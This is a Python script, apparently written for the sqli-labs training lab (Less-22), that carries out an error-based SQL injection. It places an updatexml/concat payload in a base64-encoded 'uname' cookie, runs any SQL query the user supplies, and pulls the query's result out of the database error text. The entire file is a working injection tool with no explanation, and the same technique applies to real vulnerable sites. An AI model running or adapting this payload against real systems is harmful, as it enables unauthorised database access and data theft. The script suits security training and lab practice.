#!/usr/bin/env python

import base64
import requests
import re
import string
import sys
import time
import urllib

banner = '''
USAGE: python %s <SQL Query>

EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

sourcestr = string.printable
url = "http://172.16.214.227/sqli-labs/Less-22/"
pattern = r'::[^\']+::'
result = ""

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

cookie = {
    "uname": base64.b64encode("\" and updatexml(1,concat('::',(%s),'::'),1)#+" % sys.argv[1])
}

query = {
    "uname": "admin",
    "passwd": "admin",
    "submit": "Submit"
}
print("[*] Query: %s" % cookie)

res = requests.post(url, headers=header, cookies=cookie, data=query, verify=False)
resbody = str(res.text.encode('utf-8')).lstrip("b").strip("'")
resbody = re.sub(r"\\t", "\t", resbody)
resbody = re.sub(r"\\r", "", resbody)
resbody = re.sub(r"\\\'", "\'", resbody)
resbody = re.sub(r"\\\"", "\"", resbody)
resbody = re.sub(r"\\n", "\n", resbody).strip()

try:
    result = re.search(pattern, resbody).group(0).strip('::')
except:
    result = "***NO RESULT***"

print("[*] RESULT: %s" % result)
